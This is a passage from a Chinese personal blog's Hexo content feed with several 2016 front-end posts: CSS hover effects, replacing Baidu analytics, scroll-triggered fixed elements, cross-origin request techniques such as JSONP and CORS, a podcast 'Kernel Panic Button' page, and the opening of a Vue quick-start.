class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">-webkit-transform</span>: <span class="built_in">translate3d</span>(0, 100%, 0);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate3d</span>(0, 100%, 0);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#tamaya</span><span class="selector-pseudo">:hover</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">-webkit-transform</span>: <span class="built_in">scale3d</span>(1, 1, 1);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale3d</span>(1, 1, 1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>其他几个原理类似，就没有写了。<br>以上</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>关于速度优化</title>
      <link href="/2016/05-08-fasten/"/>
      <url>/2016/05-08-fasten/</url>
      
        <content type="html"><![CDATA[<p>最近一段时间干过的最差劲的事情就是每天起床守着<a href="http://tongji.baidu.com" target="_blank" rel="noopener">百度统计</a>找存在感了。干脆删除掉，改用<a href="http://busuanzi.ibruce.info" target="_blank" rel="noopener">不蒜子</a>。还有几处js的trick，这里也一起记录一下。  </p><hr><h2 id="删除百度统计"><a href="#删除百度统计" class="headerlink" title="删除百度统计"></a>删除百度统计</h2><p>本博客放在<a href="https://github.com/gaoryrt/gaoryrt.github.io" target="_blank" rel="noopener">github上</a>，所以百度的<a href="https://www.zhihu.com/question/30898326" target="_blank" rel="noopener">爬虫并不能爬到</a>，有需要的可以看<a href="http://www.dozer.cc/2015/06/github-pages-and-cdn.html" target="_blank" rel="noopener">这一篇</a>，也可以使用<a href="http://zhanzhang.baidu.com/linksubmit/index" target="_blank" rel="noopener">百度的方法</a>：在浏览网页时提交给百度（我尝试了有半个月这个方法，结果还是不能再百度上通过<code>Blog Name Goes Here</code>或者<code>gaoryrt</code>找到自己，这也是我决心不用百度的原因之一）。<br>百度统计的js文件要求放在<code>&lt;/head&gt;</code>标签之前，这个也是反人类，凭什么在这个js加载完成之前就不能继续加载我的网页？<br>如果你是用的是<code>2016-05-08</code>之前版本的<code>hexo-theme-pln</code>，那么还请你手动在<code>/pln/layout/_partial/head.ejs</code>中删除第39到47行的内容。<br>在下一个版本的<code>hexo-theme-pln</code>中保证不用百度。应该是启用<a href="http://busuanzi.ibruce.info" target="_blank" rel="noopener">不蒜子</a>，在出大问题之前暂时不换回来，我不想让自己浪费时间再去从一些数字上找存在感了。  </p><hr><h2 id="使用不蒜子"><a href="#使用不蒜子" class="headerlink" title="使用不蒜子"></a>使用不蒜子</h2><p>对于这行文字的展示，我暂时没有想到一个美妙的方式，于是将这个结果的展示放在了源文件中，并没有展示出来，如果你想看，可以在网页源代码的最后几行找到这个结果。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span> <span class="attr">src</span>=<span class="string">"https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">'display:none'</span>&gt;</span></span><br><span class="line">总<span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_pv"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">客<span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_site_uv"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">读<span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"busuanzi_value_page_pv"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>展示的结果包括访问总量，访客数，页面阅读数。  </p><hr><h2 id="将简单的if-else语句换为三元运算符"><a href="#将简单的if-else语句换为三元运算符" class="headerlink" title="将简单的if-else语句换为三元运算符"></a>将简单的if-else语句换为三元运算符</h2><p>前提是简单，下面举一个包括else的例子：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($(current).children(<span class="string">".dropdown-content"</span>).hasClass(<span class="string">"open"</span>)) &#123;</span><br><span class="line">$(current).children(<span class="string">".dropdown-content"</span>).removeClass(<span class="string">"open"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$(current).children(<span class="string">".dropdown-content"</span>).addClass(<span class="string">"open"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>等价于：<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(current).children(".dropdown-content")[<span class="string">($(current).children(".dropdown-content").hasClass("open"))?'removeClass':'addClass'</span>](<span class="link">"open"</span>)</span><br></pre></td></tr></table></figure></p><p>三元运算符是运算符，要是你想把所有if-else全部变成三元，需要注意，直接使用<code>A ? B : C</code> JSLint会报警告的，书上的示例代码是这样的：<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">greeting</span> = <span class="string">"hello"</span> + (username ? username : <span class="string">"there"</span>);</span><br></pre></td></tr></table></figure></p><p>等价于：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">greeting = <span class="string">"hello"</span>;</span><br><span class="line">if (username)</span><br><span class="line">greeting += username;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">greeting += <span class="string">"there"</span>;</span><br></pre></td></tr></table></figure></p><hr><h2 id="加载的顺序"><a href="#加载的顺序" class="headerlink" title="加载的顺序"></a>加载的顺序</h2><p>难道我文字的展示需要等到不蒜子的js文件加载完成才能加载么？<br>那么为什么这里是<code>$(window).load(revealOnScroll)</code>而不是<code>$(document).ready(revealOnScroll)</code>。<br>我尝试了一下，加载的顺序是这样的：</p><ol><li>$(document).ready(function(){console.log(“docuready”)})</li><li>$(“body”).ready(function(){console.log(“bodyready”)})</li><li>$(window).ready(function(){console.log(“winready”)})</li><li>$(window).load(function(){console.log(“winload”)})</li></ol><p>其中window.load居然是等到了disqus的js加载完毕之后才出现的。<br>所以还是果断使用前三个把。</p><hr><h2 id="近期目标"><a href="#近期目标" class="headerlink" title="近期目标"></a>近期目标</h2><ol><li>不蒜子的展示</li><li>网页内搜索</li><li>文章列表需要一个导航，而非只有上一页下一页</li><li>加载时需要一个loading animation</li></ol><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>滚动Fixed</title>
      <link href="/2016/05-03-scrollPlaceHolder/"/>
      <url>/2016/05-03-scrollPlaceHolder/</url>
      
        <content type="html"><![CDATA[<p>这里指的是「由滚动触发，使元素变为fixed」的效果，我指的是<a href="http://www.ifanr.com" target="_blank" rel="noopener">ifanr</a>的导航栏（c-global-navbar）和边栏（o-wrapper__asides）效果。<br>当时阿里的笔试也有这个题，我笔试时遇见了blink问题，这个以后有时间再说，今天先做一个<a href="http://gaoryrt.com/CV/ifanr/">类似的demo</a>。  </p><hr><h2 id="先看一个类似的效果"><a href="#先看一个类似的效果" class="headerlink" title="先看一个类似的效果"></a>先看一个类似的效果</h2><p>就是本博客的主页，滚动时为<code>index-title</code>添加<code>animation</code>标签的这个js：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">revealOnScroll</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> scrolled = $(<span class="built_in">window</span>).scrollTop();</span><br><span class="line">  $(<span class="string">".excerpt, .index-title, .index-meta, p"</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> current = $(<span class="keyword">this</span>),</span><br><span class="line">      height = $(<span class="built_in">window</span>).outerHeight(),</span><br><span class="line">      offsetTop = current.offset().top;</span><br><span class="line">    <span class="keyword">if</span> (scrolled + height + <span class="number">50</span> &gt; offsetTop) &#123;</span><br><span class="line">      current.addClass(<span class="string">"animation"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line">$(<span class="built_in">window</span>).on(<span class="string">"scroll"</span>, revealOnScroll);</span><br><span class="line">$(<span class="built_in">window</span>).load(revealOnScroll);</span><br></pre></td></tr></table></figure></p><p>这里用到了三个高度值：  </p><ol><li><code>scrolled = $(window).scrollTop()</code> 是网页顶部滚出可视部分的高度。</li><li><code>height = $(window).outerHeight()</code> 是可视部分总高度。</li><li><code>offsetTop = current.offset().top</code> 是该元素到网页顶部的高度</li></ol><p>通过这三个值算是否进入页面，为进入的元素添加标签，用css添加动画效果。  </p><hr><h2 id="滚动固定导航栏fixed-nav"><a href="#滚动固定导航栏fixed-nav" class="headerlink" title="滚动固定导航栏fixed nav"></a>滚动固定导航栏fixed nav</h2><p>类似的，这里需要知道网页顶部滚出可视部分的高度，若这个高度超出了上方元素的总高度，就可以变为fixed了。<br><strong>但是，fixed之后原位置就没东西了，下方的东西会突然往上收。</strong><br>要是导航栏不高还好不怎么看得出来，高一点就扯了。。。<br>填充的办法还是很多的，我用了比较笨的一种，把下方元素的<code>margin-top</code>变为导航栏高度。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> scrolled = $(<span class="built_in">window</span>).scrollTop();</span><br><span class="line">$(<span class="string">".two"</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> current = $(<span class="keyword">this</span>);</span><br><span class="line">  (scrolled &gt; <span class="number">60</span>) ? current.addClass(<span class="string">"stack"</span>):current.removeClass(<span class="string">"stack"</span>);</span><br><span class="line">  $(<span class="keyword">this</span>).hasClass(<span class="string">"stack"</span>) ? $(<span class="string">".three"</span>).addClass(<span class="string">"margin"</span>):$(<span class="string">".three"</span>).removeClass(<span class="string">"margin"</span>);</span><br><span class="line">&#125;);</span><br><span class="line">$(<span class="built_in">window</span>).on(<span class="string">"scroll"</span>, stackOnScroll);</span><br></pre></td></tr></table></figure></p><p>这里用到了两个三元运算，我用的少，只知道这样写，要是有更简单的我会在<a href="http://gaoryrt.com/CV/ifanr/">demo</a>中更新。  </p><h2 id="滚动固定-fixed-sidebar"><a href="#滚动固定-fixed-sidebar" class="headerlink" title="滚动固定 fixed sidebar"></a>滚动固定 fixed sidebar</h2><p>类似，判断<code>网页顶部滚出可视部分的高度</code>加上<code>可视部分总高度</code>与<code>该元素底部里网页顶部的距离</code>，就可以容易的做出相应效果。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  $(<span class="string">".right"</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> current = $(<span class="keyword">this</span>);</span><br><span class="line">    (scrolled &gt; <span class="number">2273</span>-$(<span class="built_in">window</span>).height()) ? current.addClass(<span class="string">"stop"</span>):current.removeClass(<span class="string">"stop"</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line">$(<span class="built_in">window</span>).on(<span class="string">"scroll"</span>, stackOnScroll);</span><br></pre></td></tr></table></figure></p><hr><h2 id="接下来的问题"><a href="#接下来的问题" class="headerlink" title="接下来的问题"></a>接下来的问题</h2><p>这里先挖个坑，等我看看书再来。本来写了一个我认为可以的通用版本，但是不行。怎样做到各个元素的高度都改变之后还可以使用呢？<br>还有一个问题，大家可以看看<a href="http://www.ifanr.com" target="_blank" rel="noopener">ifanr主页</a>，右边<code>sidebar</code>在滚到最后的时候，会跟footer重合在一起，这个是个问题，怎样做到落到footer上方又重新static或relative呢？<br>以上</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Kernel Panic Button</title>
      <link href="/2016/05-01-allAboutTheButton/"/>
      <url>/2016/05-01-allAboutTheButton/</url>
      
        <content type="html"><![CDATA[<p><strong>这一篇主要讲的是跨域。</strong><br>前提：<a href="http://gaoryrt.com/2016/04-30-KernelPanicButton/">今天恐慌吗？</a><br>在那篇文章的最后提到了，由于跨域问题我并没有在线上完成<code>the kernel panic button</code>的功能。<br>然而现在可以了，下面写一写过程。<strong>想看的看，不想看就别看</strong>。  </p><hr><h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><p>跨域是浏览器为了防止XSS的结果，我的网络攻防没有过，没有权威科普<a href="https://en.wikipedia.org/wiki/Cross-site_scripting" target="_blank" rel="noopener">什么是XSS</a>，就请看官<a href="http://stackoverflow.com/search?q=xss" target="_blank" rel="noopener">自己SOF</a>。<br><em>协议、域名、端口三者必须相同，否则就属于跨域。</em>  </p><h2 id="解决跨域问题"><a href="#解决跨域问题" class="headerlink" title="解决跨域问题"></a>解决跨域问题</h2><p>来自于<a href="https://github.com/hawx1993" target="_blank" rel="noopener">hawx1993</a>的<a href="https://github.com/hawx1993/Front-end-Interview-questions" target="_blank" rel="noopener">Front-end-Interview-questions</a>。  </p><blockquote><p>JSONP：</p></blockquote><p>原理是：动态插入<code>script</code>标签，通过<code>script</code>标签引入一个<code>js</code>文件，这个js文件载入成功后会执行我们在url参数中指定的函数，并且会把我们需要的<code>json</code>数据作为参数传入。</p><p>由于同源策略的限制，<code>XmlHttpRequest</code>只允许请求当前源（域名、协议、端口）的资源，为了实现跨域请求，可以通过<code>script</code>标签实现跨域请求，然后在服务端输出JSON数据并执行回调函数，从而解决了跨域的数据请求。</p><p>优点是兼容性好，简单易用，支持浏览器与服务器双向通信。缺点是只支持GET请求。</p><p><code>JSONP</code>：<code>json+padding</code>（内填充），顾名思义，就是把JSON填充到一个盒子里</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createJs</span>(<span class="params">sUrl</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> oScript = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">        oScript.type = <span class="string">'text/javascript'</span>;</span><br><span class="line">        oScript.src = sUrl;</span><br><span class="line">        <span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>].appendChild(oScript);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    createJs(<span class="string">'jsonp.js'</span>);</span><br><span class="line"></span><br><span class="line">    box(&#123;</span><br><span class="line">       <span class="string">'name'</span>: <span class="string">'test'</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">box</span>(<span class="params">json</span>)</span>&#123;</span><br><span class="line">        alert(json.name);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>CORS</p></blockquote><p>服务器端对于<code>CORS</code>的支持，主要就是通过设置<code>Access-Control-Allow-Origin</code>来进行的。如果浏览器检测到相应的设置，就可以允许<code>Ajax</code>进行跨域的访问。</p><blockquote><p>通过修改document.domain来跨子域</p></blockquote><p>将子域和主域的<code>document.domain</code>设为同一个主域.前提条件：这两个域名必须属于同一个基础域名!而且所用的协议，端口都要一致，否则无法利用<code>document.domain</code>进行跨域</p><p>主域相同的使用<code>document.domain</code></p><blockquote><p>使用window.name来进行跨域</p></blockquote><p><code>window</code>对象有个<code>name</code>属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个<code>window.name</code>的，每个页面对<code>window.name</code>都有读写的权限，<code>window.name</code>是持久存在一个窗口载入过的所有页面中的</p><blockquote><p>使用HTML5中新引进的<code>window.postMessage</code>方法来跨域传送数据</p></blockquote><p>还有flash、在服务器上设置代理页面等跨域方式。个人认为<code>window.name</code>的方法既不复杂，也能兼容到几乎所有浏览器，这真是极好的一种跨域方法。</p><h2 id="获取html？"><a href="#获取html？" class="headerlink" title="获取html？"></a>获取html？</h2><p>主要有五个问题：  </p><ol><li>我需要获取html原文，不是json</li><li>他人站点不是我想改就改的</li><li>我是浏览器用js，不是node</li><li>我不识数</li></ol><p>所有上面提到的所有解决方法均不可用，在<a href="http://stackoverflow.com/questions/15005500/loading-cross-domain-html-page-with-ajax" target="_blank" rel="noopener">SOF上找到这么一篇</a>，科普了很多个proxy跨域的解决方案，我也不怕个人信息泄露，就大胆使用了<code>whateverorigin.org</code>来做proxy为我提供中间服务。<br>相当于他有个node可以获得html文件，然后转发给我，速度还行。</p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>今天恐慌吗？</title>
      <link href="/2016/04-30-KernelPanicButton/"/>
      <url>/2016/04-30-KernelPanicButton/</url>
      
        <content type="html"><![CDATA[<p>今天回家，路上听了第38期的内核恐慌，这一期的题目就叫做<a href="https://ipn.li/kernelpanic/38/" target="_blank" rel="noopener">Hit the Kernel Panic Button（点击查看/收听）</a>，提到了一个内核恐慌按钮，和微博用户<a href="http://weibo.com/frifrifriday" target="_blank" rel="noopener">今天是周五么</a>、话题<a href="http://weibo.com/p/1008083db00081c6bc19771bf8f16b1c7dbc15" target="_blank" rel="noopener">#索尼今天倒闭了吗#</a>的目的类似。大概是因为内核恐慌改为不定期播出了，rio说需要在官网上做一个按钮，『今天恐慌吗』？<br><em>你永远不知道你按下之后会发现什么</em>  </p><hr><h2 id="大概的思路"><a href="#大概的思路" class="headerlink" title="大概的思路"></a>大概的思路</h2><ol><li>使用js，从url得到html，我只用得到内核恐慌的html文件就行了。</li><li>解析html文件获得最新一起的时间，然后对比新建的时间，然后进行相应输出。  </li></ol><p>大概就这两个步骤。毕竟 the Kernel Panic Button 的用途很单一。想起来哪里听到过『我手机上的每一个app都有它单独的用处』，真是蠢啊。<br><strong>另，我这个是中二。 </strong> </p><h2 id="js得到html文件"><a href="#js得到html文件" class="headerlink" title="js得到html文件"></a>js得到html文件</h2><p>三个办法，其中两种用到了jquery：<br><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">function</span> readHTML()&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        async:false,</span><br><span class="line">        url : <span class="string">"https://ipn.li/kernelpanic/"</span>,</span><br><span class="line">        success : function(<span class="name">data</span>)&#123;</span><br><span class="line">            alert(<span class="name">data</span>)<span class="comment">;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)<span class="comment">;</span></span><br><span class="line">&#125;)()<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><p>上面这个版本不知道为什么在点击确定之前网页都属于加载中。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$.get(<span class="string">"https://ipn.li/kernelpanic/"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    alert(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>还有一个纯的js，详见<a href="http://stackoverflow.com/questions/8197709/javascript-read-html-from-url-into-string" target="_blank" rel="noopener">stackoverflow的讨论</a>。  </p><h2 id="从html得到最新时间"><a href="#从html得到最新时间" class="headerlink" title="从html得到最新时间"></a>从html得到最新时间</h2><p><strong>上一次这么做我还是一个不会正则的孩子，天真的我使用<code>.index</code>一层一层解析html字符串。</strong><br><strong>直到我遇见了正则。</strong><br>关于正则的学习，推荐一个网站：<a href="http://www.rubular.com" target="_blank" rel="noopener">rubular</a>，还有<code>practice makes perfect</code>。<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">function</span> htmlToDateArray(<span class="class"><span class="keyword">data</span>) &#123;</span></span><br><span class="line"><span class="class">    <span class="title">var</span> <span class="title">re</span> = /\<span class="title">d</span>&#123;1,4&#125;-\d&#123;1,2&#125;-\d&#123;1,2&#125;/;</span></span><br><span class="line">    var arr = re.exec(<span class="class"><span class="keyword">data</span>);</span></span><br><span class="line">    return arr[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h2 id="获取当前时间和比较"><a href="#获取当前时间和比较" class="headerlink" title="获取当前时间和比较"></a>获取当前时间和比较</h2><p><code>Date().format()</code>功能居然没有写到jquery的Date里面。<br>也是，javascript作为前端使用时也不应该有这么大的体积，这一期的播客中也说到了的，left-pad有它存在的理由。。。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Date</span>.prototype.Format = <span class="function"><span class="keyword">function</span>(<span class="params">fmt</span>)</span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">//author: meizz</span></span><br><span class="line">  <span class="keyword">var</span> o = &#123;</span><br><span class="line">    <span class="string">"M+"</span> : <span class="keyword">this</span>.getMonth()+<span class="number">1</span>,                 <span class="comment">//月份</span></span><br><span class="line">    <span class="string">"d+"</span> : <span class="keyword">this</span>.getDate(),                    <span class="comment">//日</span></span><br><span class="line">    <span class="string">"h+"</span> : <span class="keyword">this</span>.getHours(),                   <span class="comment">//小时</span></span><br><span class="line">    <span class="string">"m+"</span> : <span class="keyword">this</span>.getMinutes(),                 <span class="comment">//分</span></span><br><span class="line">    <span class="string">"s+"</span> : <span class="keyword">this</span>.getSeconds(),                 <span class="comment">//秒</span></span><br><span class="line">    <span class="string">"q+"</span> : <span class="built_in">Math</span>.floor((<span class="keyword">this</span>.getMonth()+<span class="number">3</span>)/<span class="number">3</span>), <span class="comment">//季度</span></span><br><span class="line">    <span class="string">"S"</span>  : <span class="keyword">this</span>.getMilliseconds()             <span class="comment">//毫秒</span></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">if</span>(<span class="regexp">/(y+)/</span>.test(fmt))</span><br><span class="line">    fmt=fmt.replace(<span class="built_in">RegExp</span>.$<span class="number">1</span>, (<span class="keyword">this</span>.getFullYear()+<span class="string">""</span>).substr(<span class="number">4</span> - <span class="built_in">RegExp</span>.$<span class="number">1.</span>length));</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> k <span class="keyword">in</span> o)</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"("</span>+ k +<span class="string">")"</span>).test(fmt))</span><br><span class="line">  fmt = fmt.replace(<span class="built_in">RegExp</span>.$<span class="number">1</span>, (<span class="built_in">RegExp</span>.$<span class="number">1.</span>length==<span class="number">1</span>) ? (o[k]) : ((<span class="string">"00"</span>+ o[k]).substr((<span class="string">""</span>+ o[k]).length)));</span><br><span class="line">  <span class="keyword">return</span> fmt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>上面代码来自<a href="http://blog.csdn.net/meizz/article/details/405708?Pending=true" target="_blank" rel="noopener">csdn 的 Meizz</a>。<br>最后上作品：<a href="http://gaoryrt.com/CV/the-Kernel-Panic-Button/">the Kernel Panic Button</a>  </p><h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><p>页面中的Javascript只能读取，访问同域的网页。<br>协议、域名、端口三者必须相同，否则就属于跨域。<br><a href="https://segmentfault.com/q/1010000000149454" target="_blank" rel="noopener">查看segmentfault的相关讨论</a><br><del>由于跨域问题，你并不能在网页上获得alert</del><br>现在你可以<a href="http://gaoryrt.com/CV/the-Kernel-Panic-Button/">在线尝试</a>、<a href="https://github.com/gaoryrt/Kernel-Panic-Button" target="_blank" rel="noopener">查看源码</a>、也可以尝试另存为html网页，然后手动拖进浏览器。经过测试均可以使用。  </p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>快速上手Vue</title>
      <link href="/2016/04-29-VueBasics/"/>
      <url>/2016/04-29-VueBasics/</url>
      
        <content type="html"><![CDATA[<p>这篇文章的目的是让你快速上手Vue。<br>如果你想知道Vue是什么，请看<a href="http://vuejs.org" target="_blank" rel="noopener">Vue的官方文档</a>。<br><a href="http://vuejs.org/guide/" target="_blank" rel="noopener">官方文档中的入门</a>已经写得足够好了，这里只是其他几个例子而已。<br>本篇中用到的例子来自于 <a href="http://vuejs.org/guide/" target="_blank" rel="noopener">Vue.js - Getting Started</a>，<a href="https://coligo.io/vuejs-the-basics/" target="_blank" rel="noopener">coligo - VueJs: The Basics</a>，<a href="http://tutorialzine.com/2016/03/5-practical-examples-for-learning-vue-js/" target="_blank" rel="noopener">tutorialzine - 5 Practical Examples For Learning Vue.js</a>和我自己。<br>顺便提一句，中文的「Vue入门」类型的文章真是少，上面几个写的很可以了。  </p><hr><h2 id="一个html，一个例子"><a href="#一个html，一个例子" class="headerlink" title="一个html，一个例子"></a>一个html，一个例子</h2><p>如果你是照着官方文档，从<code>npm install -g vue-cli</code>一步一步来，相信你的第一个例子会通过<code>npm run dev</code>开始。<br>这样做的话你的调试会变得异常方便：有webpack，JSlint，同步刷新等等。<br>但是这篇文章中的所有例子都只需要创建一个新的html，没有<code>src</code>，<code>package.js</code>，不用npm，直接拖到浏览器中就可以运行。<br>毕竟Vue.js是js，快速上手Vue要快速上手。<br>首先准备一个html文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-tag">body</span>&#123;<span class="attribute">text-align</span>:center&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  hello world!</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>对于下面的例子你要做的就是<strong>复制-粘贴-拖到浏览器里</strong>。  </p><h2 id="从new-Vue-和el开始"><a href="#从new-Vue-和el开始" class="headerlink" title="从new Vue()和el开始"></a>从<code>new 